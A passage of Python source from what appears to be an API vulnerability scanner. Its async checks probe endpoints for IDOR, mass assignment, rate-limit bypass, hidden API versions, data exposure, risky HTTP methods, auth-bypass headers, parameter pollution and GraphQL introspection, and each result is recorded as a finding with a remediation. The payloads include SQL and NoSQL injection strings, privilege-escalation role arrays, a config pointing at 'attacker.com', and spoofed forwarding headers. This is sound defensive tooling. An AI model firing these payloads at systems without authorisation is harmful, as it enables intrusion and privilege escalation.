                            logger.debug(f"Param IDOR test failed: {e}")

        # Batch IDOR testing
        await self._batch_idor_test(url, headers, findings)

        return findings

    async def _batch_idor_test(self, url: str, headers: Dict, findings: List[Finding]):
        """Test batch endpoint IDOR vulnerabilities."""
        batch_indicators = ["batch", "bulk", "multi", "array"]
        if not any(ind in url.lower() for ind in batch_indicators):
            return

        batch_payloads = [
            {"ids": [1, 2, 3, 4, 5]},
            {"items": [{"id": 1}, {"id": 2}, {"id": 3}]},
            {"users": ["user1", "user2", "admin"]},
            {
                "requests": [
                    {"method": "GET", "url": "/api/users/1"},
                    {"method": "GET", "url": "/api/users/2"},
                ]
            },
        ]

        for payload in batch_payloads:
            try:
                async with self.session.post(
                    url,
                    json=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    if r.status == 200:
                        body = await r.text(errors="ignore")
                        if len(body) > 200:
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.BOLA_IDOR,
                                    severity=Severity.CRITICAL,
                                    url=url,
                                    payload=json.dumps(payload),
                                    evidence="Batch endpoint may allow unauthorized bulk access to resources",
                                    remediation="Validate authorization for each item in batch requests",
                                    cwe="CWE-639",
                                    owasp="API1:2023",
                                    confidence="MEDIUM",
                                    tags=["bola", "idor", "batch", "bulk"],
                                )
                            )
                            if finding:
                                findings.append(finding)
            except Exception as e:
                logger.debug(f"Batch IDOR test failed: {e}")

    # ─── Advanced Mass Assignment ──────────────────────────────────────────────

    async def _mass_assign_advanced(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []
        base_headers = {**headers, "content-type": "application/json"}

        # Test 1: Direct field injection
        for field_name, field_value in self.mass_assign_fields.items():
            payload = {field_name: field_value}
            try:
                async with self.session.post(
                    url,
                    json=payload,
                    headers=base_headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    if r.status in [200, 201, 202]:
                        body = await r.text(errors="ignore")
                        if any(
                            str(v).lower() in body.lower()
                            for v in [field_value]
                            if not isinstance(field_value, dict)
                        ):
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.MASS_ASSIGNMENT,
                                    severity=Severity.HIGH,
                                    url=url,
                                    payload=json.dumps(payload),
                                    evidence=f"API accepted unauthorized field '{field_name}'. Response reflected value.",
                                    remediation="Implement strict field whitelisting. Use DTOs with explicit allowed fields.",
                                    cwe="CWE-915",
                                    owasp="API6:2023",
                                    confidence="HIGH",
                                    tags=[
                                        "mass-assignment",
                                        field_name,
                                        "whitelist-bypass",
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
                                break
            except Exception as e:
                logger.debug(f"Mass assign test failed: {e}")

        # Test 2: Nested object injection
        nested_payloads = [
            {"user": {"role": "admin", "permissions": ["all"]}},
            {"account": {"type": "premium", "features": {"unlimited": True}}},
            {
                "settings": {
                    "security": {"mfa_required": False, "password_policy": "none"}
                }
            },
            {"profile": {"verification": {"status": "verified", "level": "maximum"}}},
            {"config": {"database": {"host": "attacker.com", "password": "hacked"}}},
        ]

        for payload in nested_payloads:
            try:
                async with self.session.post(
                    url,
                    json=payload,
                    headers=base_headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    if r.status in [200, 201]:
                        body = await r.text(errors="ignore")
                        if any(k in body for k in payload.keys()):
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.NESTED_INJECTION,
                                    severity=Severity.HIGH,
                                    url=url,
                                    payload=json.dumps(payload),
                                    evidence="API accepted and processed nested object injection",
                                    remediation="Validate and sanitize nested objects. Implement deep field whitelisting.",
                                    cwe="CWE-915",
                                    owasp="API6:2023",
                                    confidence="MEDIUM",
                                    tags=[
                                        "nested-injection",
                                        "mass-assignment",
                                        "object-injection",
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
            except Exception as e:
                logger.debug(f"Nested injection test failed: {e}")

        # Test 3: Array manipulation
        array_payloads = [
            {"roles": ["admin", "user", "superuser"]},
            {"permissions": ["read", "write", "delete", "admin"]},
            {"groups": ["administrators", "sudo", "wheel"]},
            {"tags": ["internal", "trusted", "system"]},
            {"scope": ["admin", "user:write", "system:read"]},
        ]

        for payload in array_payloads:
            try:
                async with self.session.post(
                    url,
                    json=payload,
                    headers=base_headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    if r.status in [200, 201]:
                        body = await r.text(errors="ignore")
                        if any(k in body for k in payload.keys()):
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.ARRAY_MANIPULATION,
                                    severity=Severity.HIGH,
                                    url=url,
                                    payload=json.dumps(payload),
                                    evidence="API accepted array-based privilege escalation",
                                    remediation="Validate array contents against allowed values. Implement strict type checking.",
                                    cwe="CWE-915",
                                    owasp="API6:2023",
                                    confidence="MEDIUM",
                                    tags=[
                                        "array-manipulation",
                                        "mass-assignment",
                                        "privilege-escalation",
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
            except Exception as e:
                logger.debug(f"Array manipulation test failed: {e}")

        # Test 4: Type confusion attacks
        type_confusion = [
            {"id": "1 OR 1=1"},
            {"id": {"$ne": None}},
            {"version": "99999"},
            {"_version": "99999"},
            {"created_at": "2099-01-01"},
            {"deleted": "false"},
        ]

        for payload in type_confusion:
            try:
                async with self.session.post(
                    url,
                    json=payload,
                    headers=base_headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    if r.status in [200, 201]:
                        finding = self._add_finding(
                            Finding(
                                vuln_type=VulnType.MASS_ASSIGNMENT,
                                severity=Severity.HIGH,
                                url=url,
                                payload=json.dumps(payload),
                                evidence="API may be vulnerable to type confusion attacks",
                                remediation="Implement strict type validation on all input fields",
                                cwe="CWE-843",
                                owasp="API6:2023",
                                confidence="LOW",
                                tags=[
                                    "type-confusion",
                                    "mass-assignment",
                                    "input-validation",
                                ],
                            )
                        )
                        if finding:
                            findings.append(finding)
            except Exception as e:
                logger.debug(f"Type confusion test failed: {e}")

        return findings

    # ─── Advanced Rate Limiting ──────────────────────────────────────────────

    async def _rate_limit_advanced(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []

        # Test 1: Rapid sequential requests
        success_count = 0
        response_times = []
        rate_limit_headers = [
            "X-RateLimit-Limit",
            "X-RateLimit-Remaining",
            "Retry-After",
            "X-Rate-Limit",
            "RateLimit-Limit",
            "X-RateLimit-Reset",
            "X-RateLimit-Window",
            "RateLimit-Remaining",
            "RateLimit-Reset",
        ]

        for i in range(self.rate_limit_requests):
            start = time.time()
            try:
                async with self.session.get(
                    url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)
                ) as r:
                    elapsed = time.time() - start
                    response_times.append(elapsed)

                    if r.status == 200:
                        success_count += 1
                    elif r.status == 429:
                        has_headers = any(h in r.headers for h in rate_limit_headers)
                        if not has_headers:
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.RATE_LIMIT_WEAK,
                                    severity=Severity.MEDIUM,
                                    url=url,
                                    payload=f"Request {i}",
                                    evidence="Rate limit returned 429 but missing standard rate limit headers",
                                    remediation="Include X-RateLimit-* headers in rate-limited responses",
                                    cwe="CWE-770",
                                    owasp="API4:2023",
                                    confidence="MEDIUM",
                                    tags=["rate-limit", "missing-headers", "api4:2023"],
                                )
                            )
                            if finding:
                                findings.append(finding)
                        return findings
            except Exception as e:
                logger.debug(f"Rate limit test failed: {e}")

        if success_count >= int(self.rate_limit_requests * 0.9):
            avg_response_time = (
                sum(response_times) / len(response_times) if response_times else 0
            )
            finding = self._add_finding(
                Finding(
                    vuln_type=VulnType.RATE_LIMIT_MISSING,
                    severity=Severity.MEDIUM,
                    url=url,
                    payload=f"{success_count}/{self.rate_limit_requests} requests succeeded",
                    evidence=f"No rate limiting detected. {success_count} requests succeeded. Avg response time: {avg_response_time:.2f}s",
                    remediation="Implement token bucket or sliding window rate limiting. Add CAPTCHA for repeated failures.",
                    cwe="CWE-770",
                    owasp="API4:2023",
                    confidence="HIGH",
                    tags=["rate-limit", "brute-force", "api4:2023", "dos"],
                )
            )
            if finding:
                findings.append(finding)

        # Test 2: Distributed/stealthy rate limit bypass
        stealth_headers = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            {"User-Agent": "curl/7.68.0"},
            {"User-Agent": "PostmanRuntime/7.26.8"},
            {"X-Forwarded-For": f"10.0.0.{random.randint(1, 255)}"},
            {
                "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
            },
        ]

        stealth_success = 0
        for stealth_header in stealth_headers:
            test_headers = {**headers, **stealth_header}
            try:
                async with self.session.get(
                    url, headers=test_headers, timeout=aiohttp.ClientTimeout(total=5)
                ) as r:
                    if r.status == 200:
                        stealth_success += 1
            except Exception as e:
                logger.debug(f"Stealth rate limit test failed: {e}")

        if stealth_success == len(stealth_headers):
            finding = self._add_finding(
                Finding(
                    vuln_type=VulnType.RATE_LIMIT_BYPASS,
                    severity=Severity.MEDIUM,
                    url=url,
                    payload="Distributed requests with varying headers",
                    evidence="Rate limiting appears bypassable using different User-Agents or X-Forwarded-For",
                    remediation="Rate limit based on authenticated user identity or IP + fingerprint, not just User-Agent",
                    cwe="CWE-770",
                    owasp="API4:2023",
                    confidence="MEDIUM",
                    tags=["rate-limit", "bypass", "distributed", "api4:2023"],
                )
            )
            if finding:
                findings.append(finding)

        # Test 3: Burst vs sustained detection
        burst_tasks = [
            self.session.get(
                url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)
            )
            for _ in range(50)
        ]
        burst_results = await asyncio.gather(*burst_tasks, return_exceptions=True)
        burst_success = sum(
            1 for r in burst_results if hasattr(r, "status") and r.status == 200
        )

        if burst_success >= 45:
            finding = self._add_finding(
                Finding(
                    vuln_type=VulnType.RATE_LIMIT_WEAK,
                    severity=Severity.HIGH,
                    url=url,
                    payload="Burst attack: 50 concurrent requests",
                    evidence=f"Burst attack succeeded: {burst_success}/50 requests passed",
                    remediation="Implement request queueing and connection rate limiting",
                    cwe="CWE-770",
                    owasp="API4:2023",
                    confidence="HIGH",
                    tags=["rate-limit", "burst-attack", "dos", "api4:2023"],
                )
            )
            if finding:
                findings.append(finding)

        return findings

    # ─── Advanced Version Bypass ─────────────────────────────────────────────

    async def _version_bypass_advanced(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []

        # Test 1: URL path version manipulation
        for old_v in self.api_version_patterns:
            test_url = re.sub(r"/v\d+(\.\d+)?/", old_v, url)
            if test_url == url:
                continue
            try:
                async with self.session.get(
                    test_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    allow_redirects=False,
                ) as r:
                    if r.status == 200:
                        body = await r.text(errors="ignore")
                        if len(body) > 50:
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.VERSION_BYPASS,
                                    severity=Severity.MEDIUM,
                                    url=test_url,
                                    payload=old_v,
                                    evidence=f"Older/internal API version accessible. Response: {len(body)} bytes",
                                    remediation="Deprecate and disable old API versions. Implement version validation.",
                                    cwe="CWE-1059",
                                    owasp="API9:2023",
                                    confidence="HIGH",
                                    tags=[
                                        "version-bypass",
                                        "api-versioning",
                                        old_v.strip("/"),
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
                                break
            except Exception as e:
                logger.debug(f"Version bypass test failed: {e}")

        # Test 2: Content negotiation version bypass
        accept_versions = [
            "application/vnd.api+json; version=0",
            "application/vnd.api+json; version=1",
            "application/json; version=0",
            "application/json; version=internal",
            "application/json; version=admin",
            "application/json; version=debug",
            "application/json; version=legacy",
        ]

        for accept in accept_versions:
            test_headers = {**headers, "Accept": accept}
            try:
                async with self.session.get(
                    url, headers=test_headers, timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status == 200:
                        body = await r.text(errors="ignore")
                        if len(body) > 50:
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.CONTENT_NEGOTIATION,
                                    severity=Severity.MEDIUM,
                                    url=url,
                                    payload=f"Accept: {accept}",
                                    evidence=f"API responded to content negotiation version bypass",
                                    remediation="Validate and restrict accepted API versions in content negotiation",
                                    cwe="CWE-1059",
                                    owasp="API9:2023",
                                    confidence="MEDIUM",
                                    tags=[
                                        "content-negotiation",
                                        "version-bypass",
                                        "accept-header",
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
            except Exception as e:
                logger.debug(f"Content negotiation test failed: {e}")

        # Test 3: Custom API version headers
        version_headers = [
            {"X-API-Version": "v0"},
            {"X-API-Version": "internal"},
            {"X-API-Version": "admin"},
            {"X-API-Version": "debug"},
            {"API-Version": "0"},
            {"API-Version": "internal"},
            {"X-Version": "legacy"},
            {"X-Version": "0"},
        ]

        for v_header in version_headers:
            test_headers = {**headers, **v_header}
            try:
                async with self.session.get(
                    url, headers=test_headers, timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status == 200:
                        finding = self._add_finding(
                            Finding(
                                vuln_type=VulnType.VERSION_BYPASS,
                                severity=Severity.MEDIUM,
                                url=url,
                                payload=str(v_header),
                                evidence="API version bypass via custom version header",
                                remediation="Validate API version headers against allowed versions",
                                cwe="CWE-1059",
                                owasp="API9:2023",
                                confidence="MEDIUM",
                                tags=["version-header", "api-versioning", "bypass"],
                            )
                        )
                        if finding:
                            findings.append(finding)
            except Exception as e:
                logger.debug(f"Version header test failed: {e}")

        # Test 4: API version discovery
        await self._api_version_discovery(url, headers, findings)

        return findings

    async def _api_version_discovery(
        self, url: str, headers: Dict, findings: List[Finding]
    ):
        """Discover hidden API versions."""
        base = urlparse(url)
        version_paths = [f"/v{i}/" for i in range(10)] + [
            "/internal/",
            "/admin/",
            "/debug/",
            "/test/",
        ]

        for v_path in version_paths:
            test_url = f"{base.scheme}://{base.netloc}{v_path}"
            try:
                async with self.session.get(
                    test_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    allow_redirects=False,
                ) as r:
                    if r.status in [200, 401, 403]:
                        finding = self._add_finding(
                            Finding(
                                vuln_type=VulnType.API_VERSION_DISCOVERY,
                                severity=Severity.LOW,
                                url=test_url,
                                payload=v_path,
                                evidence=f"Discovered potential API version endpoint: {v_path} (Status: {r.status})",
                                remediation="Disable or protect unused API version endpoints",
                                cwe="CWE-200",
                                owasp="API9:2023",
                                confidence="LOW",
                                tags=[
                                    "version-discovery",
                                    "information-disclosure",
                                    "api9:2023",
                                ],
                            )
                        )
                        if finding:
                            findings.append(finding)
            except Exception as e:
                logger.debug(f"Version discovery failed: {e}")

    # ─── Advanced Data Exposure ────────────────────────────────────────────────

    async def _data_exposure_advanced(
        self, url: str, content: str, headers: Dict, response: aiohttp.ClientResponse
    ) -> List[Finding]:
        findings = []

        try:
            async with self.session.get(
                url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status != 200:
                    return findings

                body = await r.text(errors="ignore")
                body_lower = body.lower()

                # Test 1: Pattern-based sensitive data detection
                for pattern_def in self.sensitive_patterns:
                    matches = re.findall(pattern_def["pattern"], body)
                    if matches:
                        finding = self._add_finding(
                            Finding(
                                vuln_type=VulnType.DATA_EXPOSURE,
                                severity=pattern_def["severity"],
                                url=url,
                                payload=f"Pattern: {pattern_def['type']}",
                                evidence=f"Found {len(matches)} instances of {pattern_def['type']}: {str(matches[:3])}",
                                remediation="Filter and sanitize API responses. Implement field-level access control.",
                                cwe="CWE-213",
                                owasp="API3:2023",
                                confidence="HIGH",
                                tags=[
                                    "data-exposure",
                                    pattern_def["type"],
                                    "sensitive-data",
                                    "api3:2023",
                                ],
                            )
                        )
                        if finding:
                            findings.append(finding)

                # Test 2: Response size anomaly (excessive data)
                if len(body) > 50000:  # 50KB threshold
                    finding = self._add_finding(
                        Finding(
                            vuln_type=VulnType.DATA_EXPOSURE,
                            severity=Severity.MEDIUM,
                            url=url,
                            payload=f"Response size: {len(body)} bytes",
                            evidence="API returns excessively large responses, potentially exposing unnecessary data",
                            remediation="Implement pagination and field selection (sparse fieldsets)",
                            cwe="CWE-213",
                            owasp="API3:2023",
                            confidence="LOW",
                            tags=[
                                "data-exposure",
                                "oversized-response",
                                "missing-pagination",
                            ],
                        )
                    )
                    if finding:
                        findings.append(finding)

                # Test 3: Stack trace / error detail exposure
                if any(
                    k in body_lower
                    for k in [
                        "traceback",
                        "stack trace",
                        "exception",
                        "at line",
                        "sql error",
                        "syntax error",
                    ]
                ):
                    finding = self._add_finding(
                        Finding(
                            vuln_type=VulnType.DATA_EXPOSURE,
                            severity=Severity.MEDIUM,
                            url=url,
                            payload="Error detail exposure",
                            evidence="API exposes stack traces or detailed error messages",
                            remediation="Implement generic error responses in production. Log details server-side only.",
                            cwe="CWE-209",
                            owasp="API7:2023",
                            confidence="HIGH",
                            tags=[
                                "data-exposure",
                                "error-detail",
                                "information-disclosure",
                                "api7:2023",
                            ],
                        )
                    )
                    if finding:
                        findings.append(finding)

                # Test 4: Internal path/URL exposure
                internal_paths = re.findall(
                    r'(?i)(/var/www|/home/|/opt/|/usr/share|C:\\\\|/etc/|/tmp/)[^"\'\\s]*',
                    body,
                )
                if internal_paths:
                    finding = self._add_finding(
                        Finding(
                            vuln_type=VulnType.DATA_EXPOSURE,
                            severity=Severity.MEDIUM,
                            url=url,
                            payload=f"Internal paths: {internal_paths[:3]}",
                            evidence="API exposes internal file system paths",
                            remediation="Sanitize responses to remove internal path references",
                            cwe="CWE-213",
                            owasp="API3:2023",
                            confidence="HIGH",
                            tags=[
                                "data-exposure",
                                "internal-paths",
                                "information-disclosure",
                            ],
                        )
                    )
                    if finding:
                        findings.append(finding)

                # Test 5: Debug/verbose mode detection
                if any(
                    k in body_lower
                    for k in [
                        "debug",
                        "verbose",
                        "development",
                        "dev_mode",
                        "debug_mode",
                    ]
                ):
                    finding = self._add_finding(
                        Finding(
                            vuln_type=VulnType.DATA_EXPOSURE,
                            severity=Severity.LOW,
                            url=url,
                            payload="Debug mode indicators",
                            evidence="Response contains debug mode indicators",
                            remediation="Disable debug/verbose modes in production APIs",
                            cwe="CWE-489",
                            owasp="API7:2023",
                            confidence="LOW",
                            tags=[
                                "data-exposure",
                                "debug-mode",
                                "production-misconfig",
                            ],
                        )
                    )
                    if finding:
                        findings.append(finding)

        except Exception as e:
            logger.debug(f"Data exposure test failed: {e}")

        return findings

    # ─── Advanced Method Enumeration ─────────────────────────────────────────

    async def _method_enum_advanced(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []
        dangerous_methods = []

        methods = [
            "PUT",
            "DELETE",
            "PATCH",
            "TRACE",
            "OPTIONS",
            "CONNECT",
            "HEAD",
            "COPY",
            "MOVE",
            "LINK",
            "UNLINK",
            "LOCK",
            "UNLOCK",
            "PROPFIND",
        ]

        for method in methods:
            try:
                async with self.session.request(
                    method, url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)
                ) as r:
                    if r.status not in [404, 405, 501, 502, 503]:
                        dangerous_methods.append(method)

                        # Check for CORS preflight abuse
                        if method == "OPTIONS":
                            cors_headers = [
                                "Access-Control-Allow-Methods",
                                "Access-Control-Allow-Origin",
                                "Access-Control-Allow-Headers",
                                "Access-Control-Max-Age",
                            ]
                            exposed_cors = [h for h in cors_headers if h in r.headers]
                            if exposed_cors:
                                finding = self._add_finding(
                                    Finding(
                                        vuln_type=VulnType.CORS_API_MISCONFIG,
                                        severity=Severity.MEDIUM,
                                        url=url,
                                        payload="OPTIONS request",
                                        evidence=f"CORS preflight exposes: {exposed_cors}. Allowed methods may include: {dangerous_methods}",
                                        remediation="Restrict CORS to specific origins and necessary methods only",
                                        cwe="CWE-942",
                                        owasp="API7:2023",
                                        confidence="HIGH",
                                        tags=[
                                            "cors",
                                            "method-enum",
                                            "preflight",
                                            "api7:2023",
                                        ],
                                    )
                                )
                                if finding:
                                    findings.append(finding)
            except Exception as e:
                logger.debug(f"Method enum test failed: {e}")

        if "TRACE" in dangerous_methods:
            finding = self._add_finding(
                Finding(
                    vuln_type=VulnType.HTTP_METHOD_ENUM,
                    severity=Severity.MEDIUM,
                    url=url,
                    payload="TRACE method enabled",
                    evidence=f"Dangerous methods enabled: {', '.join(dangerous_methods)}",
                    remediation="Disable TRACE and other unnecessary HTTP methods. Implement method whitelist.",
                    cwe="CWE-16",
                    owasp="API7:2023",
                    confidence="HIGH",
                    tags=["method-enum", "trace", "xst", "api7:2023"],
                )
            )
            if finding:
                findings.append(finding)

        if (
            "PUT" in dangerous_methods
            or "DELETE" in dangerous_methods
            or "PATCH" in dangerous_methods
        ):
            finding = self._add_finding(
                Finding(
                    vuln_type=VulnType.HTTP_METHOD_ENUM,
                    severity=Severity.HIGH,
                    url=url,
                    payload=f"Methods: {', '.join(dangerous_methods)}",
                    evidence=f"Potentially dangerous HTTP methods are enabled: {', '.join(dangerous_methods)}",
                    remediation="Disable unnecessary HTTP methods. Implement proper authorization for state-changing operations.",
                    cwe="CWE-16",
                    owasp="API7:2023",
                    confidence="MEDIUM",
                    tags=["method-enum", "put", "delete", "patch", "api7:2023"],
                )
            )
            if finding:
                findings.append(finding)

        return findings

    # ─── Authentication Bypass Headers ─────────────────────────────────────────

    async def _auth_bypass_headers(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []

        for bypass_header in self.auth_bypass_headers:
            test_headers = {**headers, **bypass_header}
            try:
                async with self.session.get(
                    url, headers=test_headers, timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status == 200:
                        body = await r.text(errors="ignore")
                        baseline = self.baseline_responses.get(url, {})
                        baseline_len = baseline.get("length", 0)

                        # Compare response to baseline to detect bypass
                        if len(body) > baseline_len * 0.8:
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.AUTH_BYPASS,
                                    severity=Severity.HIGH,
                                    url=url,
                                    payload=str(bypass_header),
                                    evidence=f"Potential auth bypass with header injection. Response size: {len(body)} bytes (baseline: {baseline_len})",
                                    remediation="Validate authentication independently of client-provided headers. Implement proper session management.",
                                    cwe="CWE-306",
                                    owasp="API2:2023",
                                    confidence="MEDIUM",
                                    tags=[
                                        "auth-bypass",
                                        "header-injection",
                                        "api2:2023",
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
            except Exception as e:
                logger.debug(f"Auth bypass test failed: {e}")

        return findings

    # ─── HTTP Parameter Pollution ──────────────────────────────────────────────

    async def _parameter_pollution(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        for param, values in params.items():
            # Test duplicate parameters
            polluted_params = {**params, param: values + ["admin", "true"]}
            new_query = urlencode(polluted_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                async with self.session.get(
                    test_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status == 200:
                        body = await r.text(errors="ignore")
                        if "admin" in body.lower() or "true" in body.lower():
                            finding = self._add_finding(
                                Finding(
                                    vuln_type=VulnType.PARAMETER_POLLUTION,
                                    severity=Severity.MEDIUM,
                                    url=url,
                                    payload=f"{param}=admin&{param}=true",
                                    evidence="Parameter pollution may alter application logic",
                                    remediation="Use frameworks that properly handle duplicate parameters. Implement strict input validation.",
                                    cwe="CWE-235",
                                    owasp="API6:2023",
                                    confidence="MEDIUM",
                                    tags=[
                                        "parameter-pollution",
                                        "hpp",
                                        "input-validation",
                                        "api6:2023",
                                    ],
                                )
                            )
                            if finding:
                                findings.append(finding)
            except Exception as e:
                logger.debug(f"Parameter pollution test failed: {e}")

        # Test JSON parameter pollution
        if content and content.strip().startswith("{"):
            try:
                json_data = json.loads(content)
                for key in json_data.keys():
                    if isinstance(json_data[key], str):
                        polluted = {**json_data, key: [json_data[key], "admin"]}
                        async with self.session.post(
                            url,
                            json=polluted,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10),
                        ) as r:
                            if r.status == 200:
                                finding = self._add_finding(
                                    Finding(
                                        vuln_type=VulnType.HPP_JSON,
                                        severity=Severity.MEDIUM,
                                        url=url,
                                        payload=f"JSON: {key} array injection",
                                        evidence="JSON parameter pollution accepted by API",
                                        remediation="Validate JSON schema strictly. Reject unexpected array types for scalar fields.",
                                        cwe="CWE-235",
                                        owasp="API6:2023",
                                        confidence="MEDIUM",
                                        tags=[
                                            "parameter-pollution",
                                            "json",
                                            "schema-validation",
                                            "api6:2023",
                                        ],
                                    )
                                )
                                if finding:
                                    findings.append(finding)
            except Exception as e:
                logger.debug(f"JSON pollution test failed: {e}")

        return findings

    # ─── Advanced GraphQL Testing ────────────────────────────────────────────

    async def _graphql_advanced(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []

        if "graphql" not in url.lower():
            return findings

        base_headers = {**headers, "content-type": "application/json"}

        # Test 1: Introspection
        for payload_name, payload in self.graphql_payloads.items():
            if payload_name in ["introspection", "introspection_full"]:
                try:
                    async with self.session.post(
                        url,
                        data=payload,
                        headers=base_headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                    ) as r:
                        if r.status == 200:
                            body = await r.text(errors="ignore")
                            if "__schema" in body or "types" in body:
                                finding = self._add_finding(
                                    Finding(
                                        vuln_type=VulnType.GRAPHQL_INTROSPECTION,
                                        severity=Severity.HIGH,
                                        url=url,
                                        payload=payload_name,
                                        evidence="GraphQL introspection query succeeded - schema exposed",
                                        remediation="Disable introspection in production. Implement query depth/complexity limits.",
                                        cwe="CWE-200",
                                        owasp="API8:2023",
                                        confidence="HIGH",
                                        tags=[
                                            "graphql",
                                            "introspection",
                                            "information-disclosure",
                                            "api8:2023",
                                        ],
                                    )
                                )
                                if finding:
                                    findings.append(finding)
                except Exception as e:
                    logger.debug(f"GraphQL introspection test failed: {e}")

        # Test
